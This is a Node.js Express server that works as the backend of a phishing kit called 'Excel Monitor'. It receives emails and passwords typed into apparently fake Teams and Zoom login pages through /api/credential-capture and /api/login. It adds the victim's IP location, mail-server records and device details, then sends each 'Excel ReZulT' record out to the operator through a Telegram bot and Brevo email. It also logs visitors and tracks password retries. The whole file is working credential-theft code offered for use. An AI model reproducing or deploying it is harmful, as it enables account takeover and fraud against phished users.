const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(cors({
    origin: 'https://korea-secure-meet.netlify.app',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// CONFIG (from environment variables)
// ============================================================
const BOT_TOKEN     = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID       = process.env.TELEGRAM_CHAT_ID;

const BREVO_API_KEY = process.env.BREVO_API_KEY;
const SENDER_EMAIL  = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
const SENDER_NAME   = process.env.SENDER_NAME  || 'Excel Monitor';

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',').map(e => e.trim()).filter(Boolean);

console.log('========================================');
console.log('🔍 Config:');
console.log(`   TELEGRAM_BOT_TOKEN : ${BOT_TOKEN ? '✅' : '❌'}`);
console.log(`   TELEGRAM_CHAT_ID   : ${CHAT_ID   ? '✅' : '❌'}`);
console.log(`   BREVO_API_KEY      : ${BREVO_API_KEY ? '✅' : '❌'}`);
console.log(`   SENDER_EMAIL       : ${SENDER_EMAIL}`);
console.log(`   EMAIL_RECIPIENTS   : ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length : '❌'}`);
console.log('========================================');

// ============================================================
// HELPERS
// ============================================================
function detectPlatform(userAgent, bodyPlatform) {
    if (bodyPlatform) return bodyPlatform;
    const ua = (userAgent || '').toLowerCase();
    if (ua.includes('windows')) return 'Win32';
    if (ua.includes('mac'))     return 'MacIntel';
    if (ua.includes('linux'))   return 'Linux x86_64';
    if (ua.includes('android')) return 'Android';
    if (ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
    return 'Unknown';
}

function detectDevice(userAgent, bodyDevice) {
    if (bodyDevice) return bodyDevice;
    const ua = (userAgent || '').toLowerCase();
    if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) return 'Mobile';
    if (ua.includes('ipad') || ua.includes('tablet')) return 'Tablet';
    return 'Desktop';
}

function getShortLanguage(bodyLang, acceptLanguage) {
    if (bodyLang) return bodyLang.split('-')[0].split(',')[0];
    if (acceptLanguage) return acceptLanguage.split(',')[0].split(';')[0].split('-')[0];
    return 'Unknown';
}

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return null;
    try {
        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
        const result = await r.json();
        console.log('📤 Telegram:', result.ok ? '✅ Sent' : '❌ ' + (result.description || ''));
        return result;
    } catch (e) {
        console.error('❌ Telegram error:', e.message);
        return null;
    }
}

async function getIPInfo(ip) {
    try {
        const first = (ip || '').split(',')[0].trim();
        if (!first || first === 'Unknown' || first.startsWith('::')) {
            return { ip: ip || 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
        }
        const r = await fetch(`https://ipinfo.io/${first}/json`);
        const data = await r.json();
        return {
            ip: first,
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country || 'Unknown'
        };
    } catch (e) {
        return { ip: ip || 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
    }
}

async function getMXRecord(domain) {
    try {
        const r = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await r.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(rec => rec.data).join('\n');
        }
        return 'no-mx';
    } catch (e) {
        return 'MX-Error';
    }
}

// ============================================================
// EMAIL VIA BREVO — Excel ReZulT format
// ============================================================
async function sendEmail(email, password, ipInfo, userAgent, language, mxRecord, clientIP, extra = {}) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) return false;

    const platform = detectPlatform(userAgent, extra.platform);
    const device   = detectDevice(userAgent, extra.device);
    const timezone = extra.timezone || 'Unknown';
    const platformName = extra.platformName || 'Teams';

    const subject = `${platformName === 'Zoom' ? '📹' : '🎥'} Excel ReZulT ${ipInfo.city} ${ipInfo.region}, ${ipInfo.country} - ${email}`;

    const statusHtml = extra.match === true  ? '<div class="status match">✅ MATCH — Redirected</div>'
                     : extra.match === false ? '<div class="status mismatch">❌ MISMATCH — User retrying</div>'
                     : '<div class="status first">🔐 First entry — Silent count (1/2)</div>';

    const htmlContent = `<!DOCTYPE html><html><head><style>
body{font-family:Arial,sans-serif;background:#f5f5f5;padding:20px}
.container{max-width:700px;margin:0 auto;background:#fff;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.header{background:#1e930c;color:#fff;padding:15px;border-radius:5px 5px 0 0;text-align:center}
.content{padding:20px}
.field{margin:10px 0;padding:10px;background:#f8f8f8;border-radius:5px}
.label{font-weight:bold;color:#555;display:inline-block;min-width:150px}
.value{color:#1e930c;font-size:15px;word-break:break-all}
.pass{color:#d32f2f;font-family:monospace;font-weight:bold}
.mx{color:#1e930c;font-size:14px;white-space:pre-line;font-family:monospace}
.footer{text-align:center;padding:15px;color:#999;font-size:12px;border-top:1px solid #eee;margin-top:20px}
.status{padding:10px;border-radius:5px;text-align:center;font-weight:bold;margin:10px 0}
.match{background:#e8f5e9;color:#1b5e20}
.mismatch{background:#ffebee;color:#b71c1c}
.first{background:#e8eaf6;color:#283593}
</style></head><body><div class="container">
<div class="header"><h2>${platformName === 'Zoom' ? '📹' : '🎥'} Excel ReZulT — ${platformName} Monitor</h2></div>
<div class="content">
    ${statusHtml}

    <div class="field"><span class="label">Email :</span><span class="value"><strong>${email}</strong></span></div>
    <div class="field"><span class="label">Password :</span><span class="value pass">${password}</span></div>
    <div class="field"><span class="label">Checker :</span><span class="value">${email}:${password}</span></div>
    <div class="field"><span class="label">Browser :</span><span class="value">${userAgent}</span></div>
    <div class="field"><span class="label">💻 Platform :</span><span class="value">${platform}</span></div>
    <div class="field"><span class="label">📱 Device :</span><span class="value">${device}</span></div>
    <div class="field"><span class="label">🌐 Language :</span><span class="value">${language}</span></div>
    <div class="field"><span class="label">🕐 Timezone :</span><span class="value">${timezone}</span></div>
    <div class="field"><span class="label">MX Record :</span><span class="value mx">${mxRecord}</span></div>
    <div class="field"><span class="label">IP Address :</span><span class="value">${clientIP}</span></div>
    <div class="field"><span class="label">Region and Country :</span><span class="value">${ipInfo.city} ${ipInfo.region}, ${ipInfo.country}</span></div>
    ${extra.sessionId ? `<div class="field"><span class="label">Session :</span><span class="value">${extra.sessionId}</span></div>` : ''}
    <div class="field"><span class="label">Date :</span><span class="value">${new Date().toISOString()}</span></div>
</div>
<div class="footer"><p>© ${new Date().getFullYear()} Excel Monitor</p></div>
</div></body></html>`;

    const textContent = `--------+ Excel ReZulT ${ipInfo.city} ${ipInfo.region}, ${ipInfo.country} +--------
Email : ${email}
Password : ${password}
Checker: ${email}:${password}
Browser : ${userAgent}
💻 Platform: ${platform}
📱 Device: ${device}
🌐 Language: ${language}
🕐 Timezone: ${timezone}
MX Record : ${mxRecord}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city} ${ipInfo.region}, ${ipInfo.country}
${extra.sessionId ? `Session : ${extra.sessionId}\n` : ''}Date : ${new Date().toISOString()}
---------+ Excel ReZulT ${ipInfo.city} ${ipInfo.region}, ${ipInfo.country} +-------------`;

    try {
        const r = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject, htmlContent, textContent
            })
        });
        const data = await r.json();
        if (r.ok) {
            console.log('✅ Email sent:', data.messageId || 'sent');
            return true;
        }
        console.error('❌ Brevo error:', r.status, data.message || JSON.stringify(data));
        return false;
    } catch (e) {
        console.error('❌ Brevo error:', e.message);
        return false;
    }
}

// ============================================================
// BUILD TELEGRAM MESSAGE (Excel ReZulT format)
// ============================================================
function buildTelegramMessage({
    email, password, userAgent, language,
    platform, device, timezone, mxRecord,
    clientIP, ipInfo, platformName = 'Teams',
    sessionId
}) {
    const icon = platformName === 'Zoom' ? '📹' : '🎥';
    return `${icon} --------+ Excel ReZulT ${ipInfo.city} ${ipInfo.region}, ${ipInfo.country} +--------
Email : ${email}
Password : ${password}
Checker: ${email}:${password}
Browser : ${userAgent}
💻 Platform: ${platform}
📱 Device: ${device}
🌐 Language: ${language}
🕐 Timezone: ${timezone}
MX Record : ${mxRecord}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city} ${ipInfo.region}, ${ipInfo.country}
${sessionId ? `Session : ${sessionId}\n` : ''}Date : ${new Date().toISOString()}
---------+ Excel ReZulT ${ipInfo.city} ${ipInfo.region}, ${ipInfo.country} +-------------`;
}

// ============================================================
// HEALTH CHECK
// ============================================================
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        service: 'Excel Monitor',
        supports: ['Teams', 'Zoom'],
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length)
    });
});

// ============================================================
// MAIN ENDPOINT — /api/credential-capture (Teams + Zoom)
// ============================================================
app.post('/api/credential-capture', async (req, res) => {
    console.log('📧 Credential received');
    console.log('📋 Body:', req.body);

    const {
        email, password, source, sessionId, url,
        userAgent: bodyUA, timestamp,
        attemptCount, consecutiveCount,
        referrer, service,
        match,
        platform: bodyPlatform,
        device: bodyDevice,
        language: bodyLanguage,
        timezone: bodyTimezone,
        platformName: bodyPlatformName   // ← "Teams" or "Zoom"
    } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password required' });
    }

    const clientIP = req.headers['x-forwarded-for'] ||
                     req.connection.remoteAddress ||
                     req.socket.remoteAddress || 'Unknown';

    const userAgent = bodyUA || req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    // Resolve platform / device / language / timezone
    const platform = detectPlatform(userAgent, bodyPlatform);
    const device   = detectDevice(userAgent, bodyDevice);
    const language = getShortLanguage(bodyLanguage, acceptLanguage);
    const timezone = bodyTimezone || 'Unknown';
    const platformName = bodyPlatformName || 'Teams';

    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);

    console.log(`📍 ${ipInfo.city} ${ipInfo.region}, ${ipInfo.country}`);
    console.log(`💻 Platform: ${platform} | 📱 Device: ${device} | 🌐 Lang: ${language} | 🕐 TZ: ${timezone}`);
    console.log(`📨 MX: ${mxRecord.split('\n')[0]}`);

    // ---- Telegram ----
    const telegramMessage = buildTelegramMessage({
        email, password, userAgent, language,
        platform, device, timezone, mxRecord,
        clientIP, ipInfo, platformName, sessionId
    });
    console.log('📤 Sending to Telegram...');
    const telegramResult = await sendToTelegram(telegramMessage);

    // ---- Email ----
    console.log('📧 Sending email via Brevo...');
    const emailResult = await sendEmail(
        email, password, ipInfo, userAgent, language,
        mxRecord, clientIP,
        { match, sessionId, consecutiveCount, platform, device, timezone, platformName }
    );

    const telegramOK = !!(telegramResult && telegramResult.ok);
    const success = telegramOK || emailResult;

    console.log(`📊 Telegram: ${telegramOK}, Email: ${emailResult}`);

    return res.status(success ? 200 : 500).json({
        success,
        notifications: { telegram: telegramOK, email: emailResult }
    });
});

// ============================================================
// FALLBACK — /api/login (ABV + Zoom + others)
// ============================================================
app.post('/api/login', async (req, res) => {
    console.log('📧 Login attempt');
    const { email, password, platform: bodyPlatform, device: bodyDevice,
            language: bodyLanguage, timezone: bodyTimezone, platformName: bodyPlatformName } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password required' });
    }

    const clientIP = req.headers['x-forwarded-for'] ||
                     req.connection.remoteAddress ||
                     req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    const platform = detectPlatform(userAgent, bodyPlatform);
    const device   = detectDevice(userAgent, bodyDevice);
    const language = getShortLanguage(bodyLanguage, acceptLanguage);
    const timezone = bodyTimezone || 'Unknown';
    const platformName = bodyPlatformName || 'Web';

    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);

    const telegramMessage = buildTelegramMessage({
        email, password, userAgent, language,
        platform, device, timezone, mxRecord,
        clientIP, ipInfo, platformName
    });

    const telegramResult = await sendToTelegram(telegramMessage);
    const emailResult = await sendEmail(
        email, password, ipInfo, userAgent, language,
        mxRecord, clientIP,
        { platform, device, timezone, platformName }
    );

    const telegramOK = !!(telegramResult && telegramResult.ok);
    return res.json({
        success: telegramOK || emailResult,
        notifications: { telegram: telegramOK, email: emailResult }
    });
});

// ============================================================
// FALLBACK — /api/telegram
// ============================================================
app.post('/api/telegram', async (req, res) => {
    const { message } = req.body;
    if (!message) return res.status(400).json({ success: false });
    const r = await sendToTelegram(message);
    res.json({ success: !!(r && r.ok) });
});

// ============================================================
// FALLBACK — /api/log
// ============================================================
app.post('/api/log', async (req, res) => {
    const { email, message, platformName } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);
    const icon = platformName === 'Zoom' ? '📹' : '🎥';

    const logMessage = `${icon} --------+ Visitor Excel ${ipInfo.city} ${ipInfo.region}, ${ipInfo.country} at ${new Date().toISOString()} +--------
Email : ${email || 'Unknown'}
Message : ${message || 'N/A'}
Browser : ${userAgent}
Language : ${acceptLanguage}
IP Address : ${clientIP}
---------+ Excel Visitor ${ipInfo.city} ${ipInfo.region}, ${ipInfo.country} +-------------`;

    await sendToTelegram(logMessage);
    res.json({ success: true });
});

// ============================================================
// 404
// ============================================================
app.use('*', (req, res) => {
    res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` });
});

// ============================================================
// START
// ============================================================
app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Excel Monitor running on port ${PORT}`);
    console.log(`🎥 Teams / 📹 Zoom — POST /api/credential-capture`);
    console.log(`📧 Login : POST /api/login`);
    console.log(`📊 Health: GET  /health`);
    console.log('========================================');
});

process.on('uncaughtException', (err) => console.error('❌ Uncaught:', err.message));
process.on('unhandledRejection', (r) => console.error('❌ Unhandled:', r));